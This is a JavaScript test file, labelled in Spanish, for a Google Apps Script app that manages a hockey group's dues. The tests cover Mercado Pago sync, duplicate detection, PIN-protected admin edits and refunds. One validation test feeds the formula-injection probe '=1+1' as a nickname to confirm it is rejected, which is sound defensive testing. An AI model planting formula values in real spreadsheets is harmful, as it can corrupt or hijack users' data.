  check('vuelve a sumar con el monto corregido', adel(x.r) === antes - 1 + 15000, adel(x.r) + ' vs ' + antes);
  const mp = x.r.admin.pagos.find(q => q.apodo === 'Juancho' && q.bloqueado);
  check('el pago que trajo la sincronización figura bloqueado', !!mp && rowsOf(w, 'Pagos')[mp.fila - 2][8] === '7401');
  check('los cargados a mano sin operación vista en Mercado Pago no', x.r.admin.pagos.filter(q => q.bloqueado).length === 1);
  x = intentar(() => w.ctx.adminEditarPago(PIN, mp.fila, { apodo: 'Juancho', monto: mp.monto }, { apodo: 'Tano', monto: '999', fecha: '2026-10-01', imputacion: 'Otro de la caja' }));
  const f3 = w.sheet('Pagos').rows(mp.fila)[0];
  check('Mercado Pago: cambia integrante e imputación, no monto ni fecha', !x.e && f3[1] === 'Tano' && f3[3] === 'Otro de la caja' && f3[2] === '15000' && f3[0].indexOf(mp.fecha) === 0, x.e ? x.e.message : JSON.stringify(f3));
  x = intentar(() => w.ctx.adminEditarPago(PIN, mp.fila, { apodo: 'Juancho', monto: 15000 }, { apodo: 'Juancho', monto: '15000', fecha: '2026-10-01', imputacion: 'Cuota' }));
  check('si la fila cambió, no pisa nada', x.e && /cambió/.test(x.e.message));
  x = intentar(() => w.ctx.adminEditarPago(PIN, mp.fila, { apodo: 'Tano', monto: 15000 }, { apodo: 'Tano', imputacion: 'Otro de la caja' }));
  check('sin cambios: avisa', x.e && /No cambiaste nada/.test(x.e.message), x.e && x.e.message);
  x = intentar(() => w.ctx.adminEditarPago(PIN, fila, { apodo: 'Colo', monto: 15000 }, { apodo: 'Colo', monto: '15000', fecha: '2026-10-09', imputacion: 'Anulado' }));
  check('no se anula editando: hay que usar Anular', x.e && /Elegí a qué corresponde/.test(x.e.message));
  x = intentar(() => w.ctx.adminEditarPago(PIN, fila, { apodo: 'Colo', monto: 15000 }, { apodo: 'Colo', monto: '15000', fecha: '2026-10-11', imputacion: 'Cuota' }));
  check('no acepta fechas futuras', x.e && /fecha/.test(x.e.message));
  x = intentar(() => w.ctx.adminAnularPago('000000', fila, { apodo: 'Colo', monto: 15000 }));
  check('sin PIN no anula', x.e && /PIN/.test(x.e.message) && w.sheet('Pagos').rows(fila)[0][3] === 'Cuota');
}

section('B2 primera búsqueda desde el inicio de la temporada y posibles duplicados');
{
  const RICARDO = 444000777;
  const w = mundoAdmin(basePayments().concat([
    pay({ id: 183283723424, created: '2026-10-09 13:17', payerId: ME, amount: 15000, ptype: 'bank_transfer', pmethod: 'cvu' }),
    pay({ id: 182369302197, created: '2026-10-09 21:55', payerId: RICARDO, cuit: '20111111112', amount: 15000, first: 'Ricardo', last: 'Pereyra' }),
    pay({ id: 181809839545, created: '2026-10-07 00:08', payerId: ME, amount: 15000, ptype: 'bank_transfer', pmethod: 'cvu' }),
  ]));
  // Cargados a mano desde comprobantes del banco: con el número del banco, no el de Mercado Pago.
  const pg = w.sheet('Pagos');
  pg.getRange(pg.getLastRow() + 1, 1, 1, 10).setValues([[w.mkDate(art('2026-10-09 00:00').getTime()), 'Colo', 15000, 'Cuota', 'Transferencia bancaria', '', '', '', '86648591', '']]);
  pg.getRange(pg.getLastRow() + 1, 1, 1, 10).setValues([[w.mkDate(art('2026-10-07 00:00').getTime()), 'Dieguito', 15000, 'Cuota', 'Transferencia bancaria', '', '', '', '000123456789', '']]);
  // Y uno cargado a mano con el N° real de Mercado Pago (como los de Lokillo o Pela).
  w.payments.push(pay({ id: 182814669876, created: '2026-10-09 10:00', payerId: ID.Tano, cuit: '23351234569', amount: 15000 }));
  pg.getRange(pg.getLastRow() + 1, 1, 1, 10).setValues([[w.mkDate(art('2026-10-09 00:00').getTime()), 'Tano', 15000, 'Cuota', 'Transferencia Mercado Pago', '', '', '', '182814669876', '']]);
  // Como en la planilla real: la sincronización ya corría desde el 10/10.
  w.sheet('Config').getRange('B35').setValue(w.mkDate(art('2026-10-10 22:00').getTime()));
  let err = sync(w, '2026-10-11 10:00');
  check('sync sin error', !err, err && err.stack);
  const busquedas = () => w.fetches.filter(u => /payments\/search/.test(u)).map(decodeURIComponent);
  check('busca desde el 01/10 aunque ya había sincronizado', busquedas().some(u => /begin_date=2026-10-01T00:00/.test(u)), busquedas()[0]);
  const rev = revisar(w);
  const motivo = id => (findOp(rev, 7, id)[0] || [])[8] || '';
  check('las 3 transferencias van a Por revisar', ['183283723424', '182369302197', '181809839545'].every(id => findOp(rev, 7, id).length === 1), JSON.stringify(rev));
  check('las del banco avisan posible duplicado de Colo y de Dieguito (aunque el N° del banco sea largo)', /Posible duplicado: Colo/.test(motivo('183283723424')) && /Posible duplicado: Dieguito/.test(motivo('181809839545')), motivo('183283723424') + ' | ' + motivo('181809839545'));
  check('el cargado a mano con N° de Mercado Pago no se ofrece como duplicado y queda vinculado', !/Tano/.test(motivo('183283723424')) && rowsOf(w, 'Pagos').filter(r => r[8] === '182814669876').length === 1);
  check('la de Ricardo: no coincide con nadie', /No coincide/.test(motivo('182369302197')));
  check('ninguna entra sola a Pagos', !rowsOf(w, 'Pagos').some(r => ['183283723424', '182369302197', '181809839545'].includes(r[8])));
  w.fetches.length = 0;
  err = sync(w, '2026-10-11 10:30');
  check('la búsqueda siguiente ya es corta (2 días)', !err && busquedas().some(u => /begin_date=2026-10-09T10:00/.test(u)), busquedas()[0]);
  let x = intentar(() => w.ctx.adminEntrar(PIN));
  const t = x.r.porRevisar.find(y => y.op === '183283723424');
  const dupColo = t && t.duplicados[0];
  check('el panel muestra el posible duplicado (solo Colo)', t && t.duplicados.length === 1 && dupColo.apodo === 'Colo' && dupColo.fecha === '09/10' && dupColo.monto === 15000, JSON.stringify(t));
  check('la de Ricardo (cuenta conocida de nadie) no ofrece duplicado', x.r.porRevisar.find(y => y.op === '182369302197').duplicados.length === 0);
  check('el pago con N° de Mercado Pago visto en la búsqueda figura bloqueado', x.r.pagos.find(q => q.apodo === 'Tano' && rowsOf(w, 'Pagos')[q.fila - 2][8] === '182814669876').bloqueado);
  const intAntes = JSON.stringify(w.sheet('Integrantes').rows(2));
  x = intentar(() => w.ctx.adminEsElMismo(PIN, t.op, dupColo.filas));
  check('"Es el mismo" sin error', !x.e, x.e && x.e.stack);
  const colo = rowsOf(w, 'Pagos').find(r => r[1] === 'Colo' && r[8] === '183283723424');
  check('el pago de Colo queda con el N° de Mercado Pago y el del banco en la nota', colo && /86648591/.test(colo[9]), JSON.stringify(colo));
  check('no guarda ninguna cuenta en Integrantes', JSON.stringify(w.sheet('Integrantes').rows(2)) === intAntes);
  check('sale de Por revisar y no se suma dos veces', !findOp(revisar(w), 7, '183283723424').length &&
    rowsOf(w, 'Pagos').filter(r => r[1] === 'Colo' && r[2] === '15000' && /^09\/10\/2026/.test(r[0])).length === 1);
  err = sync(w, '2026-10-11 11:00');
  check('no vuelve a aparecer', !err && !findOp(revisar(w), 7, '183283723424').length && rowsOf(w, 'Pagos').filter(r => r[8] === '183283723424').length === 1);
  x = intentar(() => w.ctx.adminEsElMismo(PIN, '181809839545', dupColo.filas));
  check('"Es el mismo" con un pago que no es una de las opciones: error', x.e && /cambió/.test(x.e.message), x.e && x.e.message);
  const filaDiego = rowsOf(w, 'Pagos').findIndex(r => r[8] === '000123456789') + 2;
  x = intentar(() => w.ctx.adminEsElMismo(PIN, '182369302197', [{ fila: filaDiego, apodo: 'Dieguito', monto: 15000 }]));
  check('la de Ricardo no se puede unir al pago de otro', x.e && /cambió/.test(x.e.message), x.e && x.e.message);
  x = intentar(() => w.ctx.adminAsignar(PIN, '182369302197', 'Flaco'));
  check('la de Ricardo se asigna desde el panel', !x.e && rowsOf(w, 'Pagos').some(r => r[8] === '182369302197' && r[1] === 'Flaco'), x.e && x.e.message);
}

section('B3 "Buscar transferencias ahora" desde el panel');
{
  const w = mundoAdmin(basePayments().concat([pay({ id: 7301, created: '2026-10-10 18:00', payerId: ID.Juancho, cuit: '20301112223', amount: 15000 })]));
  let x = intentar(() => w.ctx.adminSincronizar('000000'));
  check('sin PIN no busca', x.e && /PIN/.test(x.e.message) && !rowsOf(w, 'Pagos').some(r => r[8] === '7301'));
  x = intentar(() => w.ctx.adminSincronizar(PIN));
  check('con PIN trae la transferencia y devuelve el panel', !x.e && /Búsqueda lista/.test(x.r.mensaje) && rowsOf(w, 'Pagos').some(r => r[8] === '7301') && x.r.admin && x.r.datos,
    x.e ? x.e.stack : x.r.mensaje);
}

section('B4 editar integrante: apodo, cuentas y fecha de alta');
{
  const w = mundoAdmin();
  w.run('asegurarEstructura_.bind(null, SpreadsheetApp.getActive())');
  w.sheet('Integrantes').getRange(5, 10).setValue('444000123, 444000124');
  let x = intentar(() => w.ctx.adminIntegrante(PIN, 'Colo'));
  check('el detalle trae los datos para editar', !x.e && x.r.datos.cuentasMp.length === 2 && x.r.datos.cuentasMp[0].fin === '0123' && x.r.datos.alta === '', JSON.stringify(x.r && x.r.datos));
  const pagosColo = rowsOf(w, 'Pagos').filter(r => r[1] === 'Colo').length;
  x = intentar(() => w.ctx.adminEditarIntegrante(PIN, 'Colo', { apodo: 'Colorado', nombre: 'Pedro', apellido: 'Colombo', cuits: '20-12345678-9',
    cvus: '0000003100000000000001', cuentasMp: ['444000124'], alta: '2026-10-20' }));
  check('guarda sin error', !x.e, x.e && x.e.stack);
  const f = w.sheet('Integrantes').rows(5)[0];
  check('Integrantes: apodo, nombre, CUIT, CVU, la cuenta que queda y el alta', f[1] === 'Colorado' && f[2] === 'Pedro' && f[3] === 'Colombo' && f[5] === '20123456789' &&
    f[6] === '0000003100000000000001' && f[9] === '444000124' && f[10] === '20/10/2026', JSON.stringify(f));
  check('el apodo nuevo queda en sus pagos', pagosColo === 2 && rowsOf(w, 'Pagos').filter(r => r[1] === 'Colorado').length === 2 &&
    !rowsOf(w, 'Pagos').some(r => r[1] === 'Colo') && /2 pagos/.test(x.r.mensaje), x.r && x.r.mensaje);
  check('entró el 20: octubre es media cuota', x.r.datos.integrantes.find(m => m.apodo === 'Colorado').estados[0].medio);
  const malos = [
    [{ apodo: 'Juancho' }, /otro integrante/],
    [{ apodo: 'Colorado', cuits: '20301112223' }, /ya está cargado para Juancho/],
    [{ apodo: 'Colorado', cuits: '123' }, /11 números/],
    [{ apodo: '=1+1' }, /apodo/],
  ];
  check('valida apodo repetido, CUIT de otro, CUIT corto y apodo raro', malos.every(([d, re]) => { const y = intentar(() => w.ctx.adminEditarIntegrante(PIN, 'Colorado', d)); return y.e && re.test(y.e.message); }));
  x = intentar(() => w.ctx.adminBaja(PIN, 'Colorado', '2026-10'));
  x = intentar(() => w.ctx.adminEditarIntegrante(PIN, 'Colorado', { apodo: 'Colorado', alta: '2026-11-02' }));
  check('el alta no puede ser después de la baja', x.e && /después del último mes/.test(x.e.message), x.e && x.e.message);
  x = intentar(() => w.ctx.adminBaja(PIN, 'Colorado', ''));
  check('se deshace la baja', !x.e && !x.r.admin.integrantes.find(m => m.apodo === 'Colorado').baja);
}

section('B5 corregir y borrar valores, con vista previa');
{
  const w = mundoAdmin();
  let x = intentar(() => w.ctx.adminEntrar(PIN));
  const filas = x.r.filasValores;
  check('el panel trae las filas de Valores', filas.length === 2 && filas[0].clave === '2026-10' && filas[0].cuota === 15000 && filas[1].clave === '2026-11' && filas[1].cuota === null, JSON.stringify(filas));
  const oct = filas[0];
  const cambio = { fila: oct.fila, esperado: oct.clave, desde: '2026-10', cuota: '16000', cancha: '120000' };
  x = intentar(() => w.ctx.adminSimularValor(PIN, Object.assign({ modo: 'editar' }, cambio)));
  const esperado = { Juancho: 3000, Flaco: 3000, Tano: 3000, Colo: 2000, Dieguito: 2000 };
  check('vista previa: cada uno paga $1.000 más por cada mes vencido o ya pagado', !x.e && x.r.afectados.length === 5 &&
    Object.keys(esperado).every(a => x.r.afectados.some(y => y.apodo === a && y.diferencia === esperado[a])), x.e ? x.e.stack : JSON.stringify(x.r.afectados));
  check('cuotas necesarias con el valor corregido', x.r && x.r.necesarios === Math.ceil(120000 / 16000));
  x = intentar(() => w.ctx.adminEditarValor(PIN, cambio));
  check('guarda la corrección', !x.e && w.sheet('Valores').getRange(oct.fila, 2).getValue() === 16000, x.e && x.e.stack);
  const nov = x.r.admin.filasValores.find(v => v.clave === '2026-11');
  x = intentar(() => w.ctx.adminSimularValor(PIN, { modo: 'borrar', fila: nov.fila, esperado: nov.clave }));
  check('vista previa de borrar la cancha de noviembre: nadie cambia', !x.e && x.r.afectados.length === 0 && x.r.necesarios === Math.ceil(120000 / 16000), x.e ? x.e.message : JSON.stringify(x.r));
  x = intentar(() => w.ctx.adminBorrarValor(PIN, { fila: nov.fila, esperado: nov.clave }));
  check('borra la fila', !x.e && w.sheet('Valores').rows(2).length === 1, x.e && x.e.message);
  const oct2 = x.r.admin.filasValores[0];
  x = intentar(() => w.ctx.adminBorrarValor(PIN, { fila: oct2.fila, esperado: oct2.clave }));
  check('no deja el inicio de la temporada sin valores', x.e && /inicio de la temporada/.test(x.e.message), x.e && x.e.message);
  x = intentar(() => w.ctx.adminEditarValor(PIN, { fila: oct2.fila, esperado: '2026-12', desde: '2026-10', cuota: '1', cancha: '1' }));
  check('si la hoja cambió, no pisa nada', x.e && /cambió/.test(x.e.message));
  x = intentar(() => w.ctx.adminEditarValor(PIN, { fila: oct2.fila, esperado: oct2.clave, desde: '2026-10', cuota: '', cancha: '' }));
  check('sin montos: pide usar Borrar', x.e && /Borrar/.test(x.e.message));
  x = intentar(() => w.ctx.adminNuevoValor(PIN, { tipo: 'cancha', monto: '150000', desde: '2026-12' }));
  const dic = x.r.admin.filasValores.find(v => v.clave === '2026-12');
  x = intentar(() => w.ctx.adminEditarValor(PIN, { fila: dic.fila, esperado: dic.clave, desde: '2026-10', cancha: '150000' }));
  check('no deja dos valores para el mismo mes', x.e && /Ya hay un valor/.test(x.e.message), x.e && x.e.message);
}

section('B6 gastos: corregir y anular');
{
  const w = mundoAdmin();
  sync(w, '2026-10-10 19:00');
  let x = intentar(() => w.ctx.adminEntrar(PIN));
  const g = x.r.gastos[0];
  check('el gasto de cancha figura bloqueado (vino de Mercado Pago)', g && g.tipo === 'Cancha' && g.bloqueado, JSON.stringify(g));
  x = intentar(() => w.ctx.adminEditarGasto(PIN, g.fila, { monto: g.monto, concepto: g.concepto }, { tipo: 'Cancha', concepto: 'Cancha de octubre', destinatario: 'Club', monto: '1', fecha: '2026-10-01' }));
  const fg = rowsOf(w, 'Gastos')[0];
  check('cambia concepto y destinatario, no monto ni fecha', !x.e && fg[2] === 'Cancha de octubre' && fg[5] === 'Club' && fg[3] === '120000' && fg[0] === '02/10/2026' &&
    /Corregido: concepto, destinatario/.test(fg[7]), x.e ? x.e.message : JSON.stringify(fg));
  check('la cancha sigue pagada', x.r.datos.cancha.pagada && x.r.datos.caja.gastado === 120000);
  x = intentar(() => w.ctx.adminAnularGasto(PIN, g.fila, { monto: 120000, concepto: 'Cancha de octubre' }));
  check('anulado: deja de restar y la cancha figura sin pagar', !x.e && x.r.datos.caja.gastado === 0 && !x.r.datos.cancha.pagada &&
    rowsOf(w, 'Gastos')[0][1] === 'Anulado' && w.sheet('Gastos').raw(2, 1).line === 'line-through', x.e && x.e.message);
  check('el público no ve el gasto anulado', x.r.datos.gastos.length === 0);
  x = intentar(() => w.ctx.adminEditarGasto(PIN, g.fila, { monto: 120000, concepto: 'Cancha de octubre' }, { tipo: 'Cancha', concepto: 'Cancha de octubre', destinatario: 'Club' }));
  check('se restaura eligiendo el tipo', !x.e && x.r.datos.caja.gastado === 120000 && rowsOf(w, 'Gastos')[0][1] === 'Cancha' && w.sheet('Gastos').raw(2, 1).line === 'none', x.e && x.e.message);
  const hg = w.sheet('Gastos');
  hg.getRange(3, 1, 1, 8).setValues([[w.mkDate(art('2026-10-05 00:00').getTime()), 'Equipamiento', 'Bochas', 30000, 'Fondo equipamiento', 'Deportes SA', '', 'Cargado desde la app']]);
  x = intentar(() => w.ctx.adminEntrar(PIN));
  const b = x.r.gastos.find(y => y.concepto === 'Bochas');
  x = intentar(() => w.ctx.adminEditarGasto(PIN, b.fila, { monto: 30000, concepto: 'Bochas' }, { tipo: 'Otro', concepto: 'Bochas y conos', destinatario: 'Deportes SA', monto: '32000', fecha: '2026-10-06' }));
  const f3 = hg.getRange(3, 1, 1, 8).getValues()[0];
  check('un gasto cargado a mano cambia monto, fecha y tipo ("sale de" acompaña)', !x.e && f3[3] === 32000 && f3[1] === 'Otro' && f3[4] === 'Caja' &&
    hg.display(3, 1) === '06/10/2026' && x.r.datos.caja.gastado === 152000, x.e ? x.e.message : JSON.stringify(f3));
}

section('B7 configuración y cambio de PIN desde el panel');
{
  const w = mundoAdmin();
  let x = intentar(() => w.ctx.adminConfig(PIN, { saldoInicial: '25000', alias: 'caja.hockey.sj', vence: '12' }));
  check('guarda saldo inicial, alias y vencimiento', !x.e && B(w, 'B6') === '25000' && B(w, 'B7') === 'caja.hockey.sj' && B(w, 'B10') === '12', x.e ? x.e.message : [B(w, 'B6'), B(w, 'B7'), B(w, 'B10')].join('|'));
  check('la app pública los usa', x.r.datos.alias === 'caja.hockey.sj' && x.r.datos.caja.saldoInicial === 25000 && x.r.datos.cancha.vence === '12/10', JSON.stringify(x.r && x.r.datos.cancha));
  check('el panel los muestra', x.r.admin.config.saldoInicial === 25000 && x.r.admin.config.alias === 'caja.hockey.sj' && x.r.admin.config.vence === 12);
  const malos = [
    [{ saldoInicial: '-5', alias: '', vence: '10' }, /saldo/],
    [{ saldoInicial: '', alias: '', vence: '10' }, /saldo/],
    [{ saldoInicial: '0', alias: 'mi alias!', vence: '10' }, /alias/],
    [{ saldoInicial: '0', alias: '', vence: '31' }, /vencimiento/],
  ];
  check('valida saldo, alias y día', malos.every(([d, re]) => { const y = intentar(() => w.ctx.adminConfig(PIN, d)); return y.e && re.test(y.e.message); }));
  x = intentar(() => w.ctx.adminCambiarPin(PIN, '111111', '654321', false));
  check('PIN actual equivocado: error propio (la app no cierra el panel)', x.e && /PIN actual no es correcto/.test(x.e.message), x.e && x.e.message);
  x = intentar(() => w.ctx.adminCambiarPin(PIN, PIN, '12', false));
  check('PIN nuevo corto: error', x.e && /6 a 12/.test(x.e.message));
  const tok = w.ctx.adminEntrar(PIN, true).token;
  x = intentar(() => w.ctx.adminCambiarPin(tok, PIN, '654321', true));
  check('cambia el PIN y da un código nuevo para este celular', !x.e && /^t:[0-9a-f]{64}$/.test(x.r.token), x.e && x.e.message);
  check('el PIN viejo ya no sirve', /PIN incorrecto/.test(((intentar(() => w.ctx.adminEntrar(PIN)).e) || {}).message || ''));
  check('el PIN nuevo sí', !intentar(() => w.ctx.adminEntrar('654321')).e);
  check('el código viejo del celular ya no sirve', !!intentar(() => w.ctx.adminEntrar(tok)).e);
  check('el código nuevo sí', !intentar(() => w.ctx.adminEntrar(x.r.token)).e);
}

section('B8 posibles duplicados de integrantes reconocidos: un día de diferencia y pagos separados');
{
  const w = mundoAdmin(basePayments().concat([
    pay({ id: 7801, created: '2026-10-01 23:40', payerId: ID.Juancho, cuit: '20301112223', amount: 45000 }),
    pay({ id: 7802, created: '2026-10-09 12:00', payerId: ID.Tano, cuit: '23351234569', amount: 21000 }),
  ]));
  const pg = w.sheet('Pagos');
  const fila = (f, a, m, i, medio, op) => pg.getRange(pg.getLastRow() + 1, 1, 1, 10).setValues([[w.mkDate(art(f + ' 00:00').getTime()), a, m, i, medio, '', '', '', op, '']]);
  fila('2026-10-02', 'Juancho', 45000, 'Cuota', 'Transferencia bancaria', '');
  fila('2026-10-02', 'Colo', 45000, 'Cuota', 'Transferencia bancaria', '');
  fila('2026-10-09', 'Tano', 15000, 'Cuota', 'Transferencia Mercado Pago', '');
  fila('2026-10-09', 'Tano', 6000, 'Deuda anterior', 'Transferencia Mercado Pago', '');
  const antes = rowsOf(w, 'Pagos').length;
  let err = sync(w, '2026-10-10 19:00');
  check('sync sin error', !err, err && err.stack);
  check('ninguna se carga sola', rowsOf(w, 'Pagos').length === antes, JSON.stringify(rowsOf(w, 'Pagos').slice(antes)));
  const mot = id => ((findOp(revisar(w), 7, id)[0]) || [])[8] || '';
  check('Juancho: posible duplicado del día siguiente', /Posible duplicado: Juancho/.test(mot('7801')), mot('7801'));
  check('Tano: pagos que suman lo mismo', /Posible duplicado: Tano tiene pagos que suman/.test(mot('7802')), mot('7802'));
  let x = intentar(() => w.ctx.adminEntrar(PIN));
  const j = x.r.porRevisar.find(y => y.op === '7801');
  check('la de Juancho solo ofrece pagos de Juancho (no el de Colo)', j.duplicados.length === 1 && j.duplicados[0].apodo === 'Juancho', JSON.stringify(j.duplicados));
  const t = x.r.porRevisar.find(y => y.op === '7802');
  check('la de Tano ofrece sus dos filas juntas', t.duplicados.length === 1 && t.duplicados[0].filas.length === 2, JSON.stringify(t.duplicados));
  x = intentar(() => w.ctx.adminEsElMismo(PIN, '7802', t.duplicados[0].filas));
  check('"Es el mismo" marca las dos filas con el N° de Mercado Pago', !x.e && rowsOf(w, 'Pagos').filter(r => r[1] === 'Tano' && r[8] === '7802').length === 2 && rowsOf(w, 'Pagos').length === antes, x.e && x.e.message);
  x = intentar(() => w.ctx.adminEsElMismo(PIN, '7801', [{ fila: t.duplicados[0].filas[0].fila, apodo: 'Tano', monto: 15000 }]));
  check('no se puede unir con un pago de otro integrante', x.e && /cambió/.test(x.e.message));
}

section('B9 devoluciones y pagos al club por otro monto: se ven y se resuelven desde la app');
{
  const p = pay({ id: 7901, created: '2026-10-10 10:00', payerId: ID.Juancho, cuit: '20301112223', amount: 15000 });
  const w = mundoAdmin(basePayments().concat([p, pay({ id: 7902, created: '2026-10-10 11:00', payerId: ME, collector: CLUB, amount: 50000 })]));
  sync(w, '2026-10-10 12:00');
  p.status = 'refunded'; p.transaction_amount_refunded = 15000; p.date_last_updated = mpDate('2026-10-10 13:00');
  sync(w, '2026-10-10 14:00');
  let x = intentar(() => w.ctx.adminEntrar(PIN));
  check('el panel muestra la devolución con el pago al que corresponde', !x.e && x.r.devoluciones.length === 1 && x.r.devoluciones[0].op === 'R7901' &&
    x.r.devoluciones[0].monto === 15000 && x.r.devoluciones[0].pagos[0].apodo === 'Juancho', JSON.stringify(x.r && x.r.devoluciones));
  check('y el pago al club por otro monto', x.r.egresos.length === 1 && x.r.egresos[0].op === '7902' && x.r.egresos[0].monto === 50000, JSON.stringify(x.r.egresos));
  check('los dos cuentan como pendientes en la app pública', w.ctx.datosApp_().pendientes === 2, w.ctx.datosApp_().pendientes);
  x = intentar(() => w.ctx.adminAnularDevuelto(PIN, 'R7901'));
  check('anular el pago devuelto: queda Anulado y se cierra el aviso', !x.e && rowsOf(w, 'Pagos').find(r => r[8] === '7901')[3] === 'Anulado' && x.r.admin.devoluciones.length === 0, x.e && x.e.message);
  x = intentar(() => w.ctx.adminDescartar(PIN, '7902'));
  check('el pago al club se marca como que no es de la caja', !x.e && x.r.admin.egresos.length === 0 && x.r.datos.pendientes === 0, x.e && x.e.message);
}

section('B10 montos con centavos desde los campos numéricos');
{
  const w = mundoAdmin();
  check('"262.5" es 262,5; "15.000" es 15.000; "1.234,50" es 1234,5', w.ctx.montoValido_('262.5') === 262.5 && w.ctx.montoValido_('15.000') === 15000 && w.ctx.montoValido_('1.234,50') === 1234.5);
  w.sheet('Gastos').getRange(3, 1, 1, 8).setValues([[w.mkDate(art('2026-10-05 00:00').getTime()), 'Otro', 'Retenciones de Mercado Pago', 262.5, 'Cuotas del mes', 'Mercado Pago (impuestos)', '', 'Diferencia entre lo transferido y lo acreditado.']]);
  let x = intentar(() => w.ctx.adminEntrar(PIN));
  const g = x.r.gastos.find(y => y.monto === 262.5);
  x = intentar(() => w.ctx.adminEditarGasto(PIN, g.fila, { monto: 262.5, concepto: g.concepto }, { tipo: 'Otro', concepto: 'Retenciones MP', destinatario: g.destinatario, monto: String(g.monto), fecha: g.iso }));
  check('cambiar solo el concepto no toca el monto', !x.e && w.sheet('Gastos').getRange(3, 4).getValue() === 262.5, x.e ? x.e.message : w.sheet('Gastos').getRange(3, 4).getValue());
  x = intentar(() => w.ctx.adminConfig(PIN, { saldoInicial: '23456.78', alias: '', vence: '10' }));
  check('saldo inicial con centavos', !x.e && w.sheet('Config').getRange('B6').getValue() === 23456.78, x.e ? x.e.message : w.sheet('Config').getRange('B6').getValue());
}

section('B11 PIN: los códigos de celular quedan atados al PIN con el que se entró');
{
  const w = mundoAdmin();
  const props = w.ctx.PropertiesService.getScriptProperties();
  const salViejo = w.ctx.salPin_(props);
  w.ctx.adminCambiarPin(PIN, PIN, '654321', false);
  let x = intentar(() => w.ctx.nuevoCelular_(props, salViejo));
  check('un código pedido con el PIN viejo no se entrega después del cambio', x.e && /El PIN cambió/.test(x.e.message), x.e && x.e.message);
  // Un código que se coló en la lista con la sal vieja no sirve.
  const tok = 't:' + 'a'.repeat(64);
  props.setProperty('ADMIN_CELULARES', JSON.stringify([{ h: w.ctx.hashPin_('celular', tok), desde: '', sal: salViejo }]));
  check('un código con la sal vieja no entra', !!intentar(() => w.ctx.adminEntrar(tok)).e);
  const fallos = () => JSON.parse(props.getProperty('ADMIN_FALLOS') || '{"n":0}').n;
  const n0 = fallos();
  x = intentar(() => w.ctx.adminCambiarPin('654321', '654320', '111222', false));
  check('equivocarse en "PIN actual" con sesión de PIN no suma intentos fallidos', x.e && /no es correcto/.test(x.e.message) && fallos() === n0, fallos() + ' vs ' + n0);
}

section('A11 cualquier orden de archivos en el editor');
{
  const archivos = ['Codigo.gs', 'Calculo.gs', 'Web.gs'];
  const ordenes = [];
  archivos.forEach(a => archivos.forEach(b => archivos.forEach(c => {
    if (a !== b && b !== c && a !== c) ordenes.push([a, b, c]);
  })));
  ordenes.forEach(orden => {
    const ui = uiPin(PIN), menu = [];
    ui.createMenu = () => { const m = { addItem: (t) => { menu.push(t); return m; }, addSeparator: () => m, addToUi: () => {} }; return m; };
    const r = intentar(() => {
      const w = newWorld(basePayments(), { orden, ui });
      w.setNow(nowIso('2026-10-10 20:00'));
      w.run('onOpen');
      w.run('recalcularAhora');
      return w.ctx.datosApp_();
    });
    check('menú, recalcular y app con ' + orden.join(', '),
      !r.e && menu.length === 7 && /Listo/.test(ui.alerts[0]) && r.r.cancha.costo === 120000, r.e ? r.e.message : menu.length + ' ' + ui.alerts[0] + ' ' + JSON.stringify(r.r.cancha));
  });
}

// ------------------------------------------------------------ summary
const fails = results.filter(r => !r.ok);
console.log('\n================ SUMMARY ================');
console.log(`checks: ${results.length}, pass: ${results.length - fails.length}, fail: ${fails.length}`);
fails.forEach(f => console.log(`FAIL [${f.scenario}] ${f.label}${f.detail ? '\n      ' + String(f.detail).split('\n')[0] : ''}`));
